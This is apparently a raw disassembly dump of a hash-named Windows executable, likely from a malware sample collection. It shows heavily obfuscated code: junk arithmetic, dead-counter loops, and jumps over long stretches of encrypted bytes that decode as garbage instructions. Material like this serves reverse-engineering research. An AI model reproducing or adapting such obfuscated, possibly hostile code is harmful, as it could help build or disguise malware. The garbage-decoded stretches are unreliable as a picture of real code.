
4f89abd99ad9b24e582300b4b69db96cbcdbc0f0aa50fba7d971edeec998c5b2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43355b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4335f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4335a7
  401023:	or     DWORD PTR ds:0x433553,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433543,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [edi+0x7c2ef7ed],esp
  40104c:	jl     0x4010ca
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    eax,DWORD PTR [edx]
  401060:	call   0x1ac2:0xf330f02
  401067:	(bad)  
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0xd152:0x3a3fa6c9
  4010ff:	mov    ch,0xcd
  401101:	fiadd  WORD PTR [edx]
  401103:	inc    eax
  401104:	les    edi,FWORD PTR [eax]
  401106:	xchg   edx,eax
  401107:	add    DWORD PTR [esi],edx
  401109:	and    ecx,esp
  40110b:	add    DWORD PTR [esp+ecx*4],0x59c9e315
  401112:	sub    ebx,edx
  401114:	xchg   BYTE PTR [ebx-0x4ff22360],bl
  40111a:	out    dx,eax
  40111b:	adc    bh,BYTE PTR ds:0xdb01cdf7
  401121:	out    0x28,eax
  401123:	or     eax,0x74e43b8e
  401128:	jo     0x4011a6
  40112a:	shl    BYTE PTR [ebp+0x715d53d3],cl
  401130:	hlt    
  401131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401132:	inc    ebx
  401133:	in     al,dx
  401134:	add    BYTE PTR [eax+0x4af6a77e],0xe0
  40113b:	mov    ch,0x2
  40113d:	mov    edi,0xfaf5c766
  401142:	es or  al,0x14
  401145:	outs   dx,DWORD PTR ds:[esi]
  401146:	test   BYTE PTR ds:0xb7ebd0bc,bl
  40114c:	add    eax,0xd314e1de
  401151:	loope  0x4011c6
  401153:	out    dx,eax
  401154:	popf   
  401155:	out    0x4e,eax
  401157:	and    eax,0xc22b27a3
  40115c:	(bad)  
  40115d:	or     ch,dh
  40115f:	mov    ds:0xd98866b,al
  401164:	xlat   BYTE PTR ds:[ebx]
  401165:	mov    esp,DWORD PTR [esi]
  401167:	mov    dl,0x27
  401169:	int    0x76
  40116b:	out    0xc2,eax
  40116d:	fadd   DWORD PTR [eax]
  40116f:	mov    esp,0x3387b297
  401174:	repnz push esi
  401176:	and    ch,bh
  401178:	imul   ecx,DWORD PTR [esi],0x89f2f9ed
  40117e:	sbb    eax,0xc892a2b4
  401183:	loope  0x4011db
  401185:	xchg   edi,eax
  401186:	out    0xef,al
  401188:	jbe    0x401199
  40118a:	(bad)  
  40118b:	jle    0x401160
  40118d:	mov    bl,0xd0
  40118f:	nop
  401190:	(bad)
  401193:	mov    edi,0x83742f5f
  401198:	push   edx
  401199:	pop    ss
  40119a:	sub    dl,BYTE PTR cs:[ebp-0x73]
  40119e:	dec    ebx
  40119f:	mov    ds:0x64129e1c,eax
  4011a5:	dec    edi
  4011a6:	push   DWORD PTR [ebx+0x71]
  4011a9:	cmp    eax,0xd1bb7c58
  4011ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011af:	ds jo  0x401221
  4011b2:	push   ds
  4011b3:	push   edi
  4011b4:	and    ah,cl
  4011b6:	mov    DWORD PTR [edx],ebp
  4011b8:	adc    bl,cl
  4011ba:	mov    ds:0x7b8c04a5,eax
  4011bf:	test   BYTE PTR [eax+0x617ed012],0x5a
  4011c6:	out    0xf1,al
  4011c8:	jbe    0x401173
  4011ca:	and    BYTE PTR [ecx-0x4e548ff5],dl
  4011d0:	mov    ds:0x8f3b7f2f,eax
  4011d5:	jl     0x401163
  4011d7:	jmp    0x79e5dbb9
  4011dc:	into   
  4011dd:	sbb    al,0x84
  4011df:	jle    0x40122d
  4011e1:	pusha  
  4011e2:	mov    cl,0x1e
  4011e4:	or     al,0x77
  4011e6:	lods   al,BYTE PTR ds:[esi]
  4011e7:	retf   
  4011e8:	add    BYTE PTR [eax+0x51],ch
  4011eb:	jp     0x401254
  4011ed:	outs   dx,DWORD PTR ds:[si]
  4011ef:	mov    ch,0x86
  4011f1:	daa    
  4011f2:	push   es
  4011f3:	popa   
  4011f4:	jb     0x4011c4
  4011f6:	mov    ds:0xde3a970b,eax
  4011fb:	fidivr WORD PTR [ebx-0xf]
  4011fe:	xor    dl,ah
  401200:	cli    
  401201:	jmp    0xec74ad63
  401206:	xchg   ebp,eax
  401207:	imul   ebx,DWORD PTR ds:0x103284a1,0x7d
  40120e:	jnp    0x401265
  401210:	sahf   
  401211:	mov    ah,0xa
  401213:	rcl    DWORD PTR [esp+ebx*1-0x63],1
  401217:	hlt    
  401218:	ss push esi
  40121a:	xor    eax,edi
  40121c:	mov    bl,0x2
  40121e:	xchg   ebx,eax
  40121f:	lods   eax,DWORD PTR ds:[esi]
  401220:	xor    BYTE PTR [ecx+0x47c9fe4f],ah
  401226:	push   eax
  401227:	scas   eax,DWORD PTR es:[edi]
  401228:	ret    
  401229:	lods   al,BYTE PTR ds:[esi]
  40122a:	xchg   BYTE PTR [esi-0x7f],ah
  40122d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40122e:	int3   
  40122f:	stos   DWORD PTR es:[edi],eax
  401230:	retf   
  401231:	retf   
  401232:	sub    edi,ecx
  401234:	inc    ebx
  401235:	sbb    ah,BYTE PTR [ebx-0x56f298c7]
  40123b:	xchg   edi,eax
  40123c:	stos   DWORD PTR es:[edi],eax
  40123d:	scas   eax,DWORD PTR es:[edi]
  40123e:	fs daa 
  401240:	daa    
  401241:	and    dl,BYTE PTR [edi+0x74]
  401244:	mov    eax,es:0xfdebd469
  40124a:	call   0x90224fd5
  40124f:	mov    ch,0xab
  401251:	push   ebp
  401252:	add    DWORD PTR [ebp+0x25d62087],edx
  401258:	shl    BYTE PTR [ebx-0x773aef66],cl
  40125e:	(bad)  
  40125f:	inc    BYTE PTR [ebx]
  401261:	mov    dh,0xdd
  401263:	adc    DWORD PTR [ebx-0x53501072],0x2972bb63
  40126d:	or     ebp,DWORD PTR [ebp+0x1eb8e3a7]
  401273:	xchg   DWORD PTR [edi+0x68],esi
  401276:	shl    BYTE PTR [eax+0x49],cl
  401279:	sub    eax,0xf53a7dc4
  40127e:	pop    esp
  40127f:	fcom   QWORD PTR [ecx]
  401281:	repnz and DWORD PTR [ecx+0x35],edi
  401285:	outs   dx,DWORD PTR ds:[esi]
  401286:	outs   dx,BYTE PTR ds:[esi]
  401287:	pop    edx
  401288:	fdivr  DWORD PTR [ebx-0x4]
  40128b:	xchg   ecx,eax
  40128c:	neg    DWORD PTR [edx+0xc]
  40128f:	sti    
  401290:	ins    DWORD PTR es:[edi],dx
  401291:	mov    edi,0x6b65de42
  401296:	adc    DWORD PTR [ecx+0x2b],edi
  401299:	sub    BYTE PTR [edx-0x7c],0xd9
  40129d:	add    eax,0x85573022
  4012a2:	test   DWORD PTR [ecx+0x61],eax
  4012a5:	push   ebx
  4012a6:	call   DWORD PTR [eax+0x7c]
  4012a9:	or     al,BYTE PTR [esi+0x5c75f032]
  4012af:	ds movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4012b2:	pop    edi
  4012b3:	(bad)  
  4012b4:	lods   eax,DWORD PTR ds:[esi]
  4012b5:	cli    
  4012b6:	call   0xf8171f8a
  4012bb:	and    eax,0xa1ac18d2
  4012c0:	arpl   WORD PTR [edi-0x776843e1],dx
  4012c6:	int    0x4
  4012c8:	xor    al,0x20
  4012ca:	retf   0xe1f0
  4012cd:	aaa    
  4012ce:	je     0x40132f
  4012d0:	retf   0xc682
  4012d3:	jae    0x401264
  4012d5:	sub    dl,BYTE PTR [edx+0x11a8de15]
  4012db:	adc    BYTE PTR [ebp+0x7ffb8f1d],dh
  4012e1:	xchg   ebp,eax
  4012e2:	aad    0x24
  4012e4:	loop   0x4012ef
  4012e6:	pop    edx
  4012e7:	(bad)  
  4012e8:	sti    
  4012e9:	pop    esi
  4012ea:	call   0x326f:0xbec839f2
  4012f1:	pushf  
  4012f2:	add    DWORD PTR [esi-0x6c],ebx
  4012f5:	lds    esi,FWORD PTR [ebx+0x2d]
  4012f8:	mov    bh,0x9d
  4012fa:	push   0xd640599f
  4012ff:	adc    BYTE PTR [ecx+0x5f098f78],bh
  401305:	inc    ebx
  401306:	mov    eax,ecx
  401308:	lahf   
  401309:	jb     0x4012b4
  40130b:	nop
  40130c:	or     al,0xe9
  40130e:	cwde   
  40130f:	std    
  401310:	leave  
  401311:	sub    eax,0xd0f4d76f
  401316:	dec    edi
  401317:	sub    al,dh
  401319:	add    ch,BYTE PTR [edx]
  40131b:	jnp    0x4012c5
  40131d:	inc    esp
  40131e:	jecxz  0x4012ae
  401320:	push   esi
  401321:	add    DWORD PTR [edx-0x87b54a5],edx
  401327:	adc    eax,0x31cb59e
  40132c:	es jns 0x401376
  40132f:	xor    eax,0xe114bae7
  401334:	cli    
  401335:	sti    
  401336:	mov    edi,0xb7e4a684
  40133b:	into   
  40133c:	mov    eax,DWORD PTR [ebp+0x8]
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4335a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43359b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43361f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43361f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43361f,ebx
  401379:	cmp    DWORD PTR ds:0x43361f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43361f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433563,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43359f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433597,0x19
  4013f7:	cmp    DWORD PTR ds:0x433597,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433597,0xb
  40140b:	jne    0x401421
  401411:	push   0x433553
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433597,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433597
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433597,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433597
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433597,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43354f,0x433543
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433553,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43361b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43361b
  40148e:	inc    eax
  40148f:	mov    ds:0x43361b,eax
  401494:	cmp    DWORD PTR ds:0x43361b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43361b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43361b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43361b,eax
  4014c4:	cmp    DWORD PTR ds:0x43361b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4335df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43355b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43354f,0x43359f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	adc    DWORD PTR [esi+0x7e67f8e7],eax
  401518:	jl     0x401596
  40151a:	addr16 jle 0x401599
  40151d:	jl     0x401573
  40151f:	mov    eax,ds:0xc8d5a9d7
  401524:	pop    edi
  401525:	mov    esp,ebx
  401527:	add    eax,0x99fa6350
  40152c:	js     0x4014c2
  40152e:	pop    ds
  40152f:	loopne 0x401527
  401531:	inc    esp
  401532:	aaa    
  401533:	ja     0x4015b4
  401535:	mov    al,0xa6
  401537:	sub    eax,0x217fcb3d
  40153c:	stos   BYTE PTR es:[edi],al
  40153d:	lods   eax,DWORD PTR ds:[esi]
  40153e:	jne    0x401581
  401540:	sub    al,0x24
  401542:	add    ecx,edi
  401544:	adc    ch,dl
  401546:	push   0xffffff9a
  401548:	test   al,0x1d
  40154a:	jns    0x401514
  40154c:	cmp    eax,0x78e999f5
  401551:	cs cs dec eax
  401554:	add    edx,DWORD PTR [edi+ebx*2-0x68a1277a]
  40155b:	aam    0x6a
  40155d:	adc    al,0x9
  40155f:	mov    eax,0x60c9aa17
  401564:	xchg   esi,eax
  401565:	mov    al,ds:0x8152c4f0
  40156a:	push   cs
  40156b:	adc    ch,BYTE PTR [ebx-0x7f]
  40156e:	jo     0x4015c9
  401570:	jecxz  0x40157d
  401572:	imul   esp,esi,0x16847ac4
  401578:	mov    es,WORD PTR [ebx-0x1]
  40157b:	sahf   
  40157c:	mov    ebp,0x4f785d9b
  401581:	out    dx,eax
  401582:	repz aad 0x51
  401585:	jecxz  0x401546
  401587:	icebp  
  401588:	push   ss
  401589:	xor    DWORD PTR [ebx+esi*8],ecx
  40158c:	and    BYTE PTR [ecx-0x7b],bl
  40158f:	inc    edi
  401590:	cmp    eax,0xc3f0da9e
  401595:	and    dl,BYTE PTR [edi-0x7658a7a]
  40159b:	fisubr WORD PTR [ebp+0x4e]
  40159e:	xchg   esp,eax
  40159f:	dec    esp
  4015a0:	and    eax,0xf10c9e11
  4015a5:	fiadd  WORD PTR gs:[edx-0x41]
  4015a9:	cli    
  4015aa:	pushf  
  4015ab:	pop    ds
  4015ac:	mov    WORD PTR [edi],fs
  4015ae:	lds    esi,FWORD PTR [eax]
  4015b0:	mov    DWORD PTR [edx+0x6a44457],ebx
  4015b6:	pop    ecx
  4015b7:	add    BYTE PTR [edi+edi*1+0x6f4ebbb1],al
  4015be:	lods   al,BYTE PTR ds:[esi]
  4015bf:	pop    ss
  4015c0:	push   ebx
  4015c1:	inc    ebx
  4015c2:	shl    BYTE PTR [eax+eax*2],0x45
  4015c6:	xchg   edx,eax
  4015c7:	int3   
  4015c8:	aad    0xfb
  4015ca:	cmp    BYTE PTR [eax+edi*4+0x3fe9a8eb],bh
  4015d1:	xlat   BYTE PTR ds:[ebx]
  4015d2:	dec    edi
  4015d3:	sbb    DWORD PTR [eax-0x7c],0x854cc9a5
  4015da:	arpl   WORD PTR ds:0xfac2bd52,dx
  4015e0:	aas    
  4015e1:	xchg   ebp,eax
  4015e2:	mov    ch,0xe6
  4015e4:	push   0xffffff88
  4015e6:	inc    BYTE PTR [edx-0x53]
  4015e9:	mov    ds:0xb35b31e9,al
  4015ee:	or     DWORD PTR [edx-0x3f],edi
  4015f1:	mov    ds:0xbe6f373f,eax
  4015f6:	cmp    ecx,edx
  4015f8:	fwait
  4015f9:	dec    eax
  4015fa:	ins    BYTE PTR es:[edi],dx
  4015fb:	js     0x40160e
  4015fd:	pop    ebp
  4015fe:	mov    al,BYTE PTR [esi]
  401600:	popa   
  401601:	rcl    BYTE PTR [eax+0x53c26959],cl
  401607:	push   edi
  401608:	ins    DWORD PTR es:[edi],dx
  401609:	ja     0x4015bb
  40160b:	ja     0x401601
  40160d:	cmp    BYTE PTR [edx+0x1b],0xe2
  401611:	push   ds
  401612:	repnz aam 0x23
  401615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401616:	push   ebp
  401617:	int3   
  401618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401619:	add    bl,bh
  40161b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40161c:	cmp    eax,0x4f9b23e8
  401621:	jecxz  0x40167e
  401623:	out    dx,eax
  401624:	adc    edx,DWORD PTR [edi+0x36]
  401627:	pusha  
  401628:	inc    eax
  401629:	adc    eax,0xdf897905
  40162e:	ins    BYTE PTR es:[edi],dx
  40162f:	mov    edx,0x7ef8aae8
  401634:	dec    ebx
  401635:	outs   dx,DWORD PTR ds:[esi]
  401636:	mov    dh,0x77
  401638:	fcom   QWORD PTR [ebx-0x75d72676]
  40163e:	mov    ds:0xa57bfa8c,al
  401643:	pop    ecx
  401644:	dec    ebp
  401645:	outs   dx,DWORD PTR ds:[esi]
  401646:	int    0xd7
  401648:	push   es
  401649:	leave  
  40164a:	jecxz  0x401676
  40164c:	adc    al,0xdb
  40164e:	mov    cl,0xaa
  401650:	and    al,0x6f
  401652:	xlat   BYTE PTR ds:[ebx]
  401653:	xor    eax,0xa27cbf61
  401658:	inc    esi
  401659:	xlat   BYTE PTR ds:[ebx]
  40165a:	in     al,0x99
  40165c:	(bad)  
  40165e:	push   ebx
  40165f:	inc    ebp
  401660:	pop    edi
  401661:	mov    bh,0x49
  401663:	mov    BYTE PTR [ebx],bh
  401665:	mov    eax,ds:0xbe195e99
  40166a:	xor    ah,ah
  40166c:	mov    dh,0x5
  40166e:	cmp    BYTE PTR [ebp+0x7f],dl
  401671:	clc    
  401672:	test   al,0xe2
  401674:	shl    DWORD PTR [esi],0xe9
  401677:	mov    eax,ds:0x3a6bb7cd
  40167c:	push   es
  40167d:	push   eax
  40167e:	mov    WORD PTR [ecx-0x2a40e0c0],?
  401684:	(bad)  
  401685:	sub    BYTE PTR [edx+0x4f],bl
  401688:	and    BYTE PTR [edx-0x334d1535],dl
  40168e:	daa    
  40168f:	jge    0x401622
  401691:	add    DWORD PTR [ebp-0x6f],esi
  401694:	pop    ds
  401695:	out    dx,al
  401696:	(bad)  
  401697:	(bad)  
  401698:	ins    DWORD PTR es:[di],dx
  40169a:	inc    ebp
  40169b:	pusha  
  40169c:	mov    dh,0x3c
  40169e:	jo     0x40164d
  4016a0:	push   esp
  4016a1:	xor    eax,0x6cf96140
  4016a6:	jmp    0x401667
  4016a8:	jb     0x401719
  4016aa:	fs dec edi
  4016ac:	sahf   
  4016ad:	mov    esp,0x7aac2083
  4016b2:	inc    edi
  4016b3:	mov    BYTE PTR [ebx+edx*4-0x19ab58bd],ah
  4016ba:	lds    esp,FWORD PTR [eax-0x46]
  4016bd:	pop    eax
  4016be:	rol    BYTE PTR [edx],1
  4016c0:	gs xchg edx,eax
  4016c2:	das    
  4016c3:	sbb    DWORD PTR [eax],0xffffffcb
  4016c6:	mov    ecx,0xfaffa78a
  4016cb:	loop   0x401705
  4016cd:	push   ecx
  4016ce:	push   0x6a62ca9a
  4016d3:	sbb    bh,BYTE PTR [eax]
  4016d5:	and    esi,DWORD PTR [ecx]
  4016d7:	inc    eax
  4016d8:	lods   al,BYTE PTR ds:[esi]
  4016d9:	test   BYTE PTR cs:[ebx],dh
  4016dc:	jbe    0x40170c
  4016de:	out    dx,eax
  4016df:	mov    ds:0x1d454373,eax
  4016e4:	add    dl,BYTE PTR [eax+0x22]
  4016e7:	in     al,dx
  4016e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e9:	shl    BYTE PTR [eax+0x22],0xae
  4016ed:	xchg   edx,eax
  4016ee:	arpl   WORD PTR [ebx-0x2b500968],dx
  4016f4:	dec    ecx
  4016f5:	sbb    BYTE PTR [esi+eiz*1-0x74dcdf97],0x9a
  4016fd:	repz in al,dx
  4016ff:	ins    BYTE PTR es:[edi],dx
  401700:	pop    es
  401701:	and    eax,0x4a591bfe
  401706:	lock ret 0x3201
  40170a:	dec    edx
  40170b:	loope  0x401776
  40170d:	lahf   
  40170e:	pop    ds
  40170f:	imul   eax,eax,0x5
  401712:	ss xchg esi,eax
  401714:	ret    
  401715:	ret    
  401716:	repz das 
  401718:	repnz scas eax,DWORD PTR es:[edi]
  40171a:	dec    ebp
  40171b:	xchg   edi,eax
  40171c:	inc    edx
  40171d:	call   0xf0f21b89
  401722:	adc    DWORD PTR [eax],ecx
  401724:	xor    BYTE PTR [ebp-0x7265ee54],ch
  40172a:	neg    DWORD PTR [edx+0x56d8131e]
  401730:	mov    ebx,eax
  401732:	inc    edi
  401733:	fld    QWORD PTR [ebx+ebp*1]
  401736:	mov    edx,0x94414265
  40173b:	adc    ah,BYTE PTR [ecx-0x2091870a]
  401741:	cwde   
  401742:	das    
  401743:	dec    ecx
  401744:	sahf   
  401745:	das    
  401746:	and    eax,0xd32f4b3a
  40174b:	fld    DWORD PTR ds:0xae56c1bf
  401751:	and    BYTE PTR [esi+0xd],dl
  401754:	push   ecx
  401755:	mov    BYTE PTR [ecx+0x433bf5c],al
  40175b:	inc    ebx
  40175c:	pop    ebp
  40175d:	push   ss
  40175e:	jnp    0x401796
  401760:	punpckhdq mm6,mm1
  401763:	inc    ebp
  401764:	ror    BYTE PTR [ecx+0x25a03f9f],cl
  40176a:	sub    bl,dl
  40176c:	lods   al,BYTE PTR ds:[esi]
  40176d:	push   ss
  40176e:	cld    
  40176f:	jg     0x401725
  401771:	arpl   WORD PTR [ebx+0x7010089e],bp
  401777:	call   0xc612:0x4e44af5e
  40177e:	fcom   DWORD PTR [eax+0x30]
  401781:	xchg   ebx,eax
  401782:	gs int3 
  401784:	mov    ebx,0x36869ca
  401789:	loop   0x4017c6
  40178b:	fdivr  DWORD PTR [ebx+0x7]
  40178e:	jae    0x401727
  401790:	cmp    BYTE PTR [ebx],bl
  401792:	push   es
  401793:	and    ebp,ebp
  401795:	jae    0x4017ca
  401797:	ja     0x401807
  401799:	aad    0xad
  40179b:	clc    
  40179c:	xor    BYTE PTR [ebx+0x513fe821],0xee
  4017a3:	scas   al,BYTE PTR es:[edi]
  4017a4:	cli    
  4017a5:	jb     0x4017f1
  4017a7:	clc    
  4017a8:	aad    0xa8
  4017aa:	push   edx
  4017ab:	sahf   
  4017ac:	and    BYTE PTR [ebp-0x737875a3],bl
  4017b2:	add    BYTE PTR [edi+0x4876fedb],dl
  4017b8:	pop    eax
  4017b9:	call   0x3ef4:0xf88c8cbe
  4017c0:	pop    edx
  4017c1:	pop    eax
  4017c2:	call   DWORD PTR [edx-0x6384eefb]
  4017c8:	pushf  
  4017c9:	test   ebx,eax
  4017cb:	add    al,BYTE PTR [edi+ebx*4+0x3a]
  4017cf:	xchg   ebx,eax
  4017d0:	xor    edi,DWORD PTR [eax+esi*4]
  4017d3:	cmc    
  4017d4:	aaa    
  4017d5:	ja     0x4017ee
  4017d7:	or     ebx,edx
  4017d9:	sub    ch,dh
  4017db:	das    
  4017dc:	dec    edx
  4017dd:	pop    edi
  4017de:	xor    dl,BYTE PTR [eax]
  4017e0:	cdq    
  4017e1:	adc    eax,0x5c269559
  4017e6:	scas   al,BYTE PTR es:[edi]
  4017e7:	les    eax,FWORD PTR [edi-0x158fcdae]
  4017ed:	pop    esi
  4017ee:	je     0x401780
  4017f0:	mov    ecx,0xdf8e4b5
  4017f5:	ss leave 
  4017f7:	(bad)  
  4017f8:	popf   
  4017f9:	xchg   edx,eax
  4017fa:	sub    DWORD PTR [edi-0x5c],esp
  4017fd:	adc    eax,0x593c41bb
  401802:	cdq    
  401803:	push   edi
  401804:	aad    0xab
  401806:	push   eax
  401807:	add    ecx,DWORD PTR [eax]
  401809:	mov    eax,ds:0x433657
  40180e:	add    DWORD PTR ds:0x43354b,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43359b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43359b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433563,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43362f,0x433617
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4335ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4335e7,0x18
  401872:	cmp    DWORD PTR ds:0x4335e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4335e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4335e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4335e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433617,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433617
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433617,edx
  4018db:	cmp    DWORD PTR ds:0x433617,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433617,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43366f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
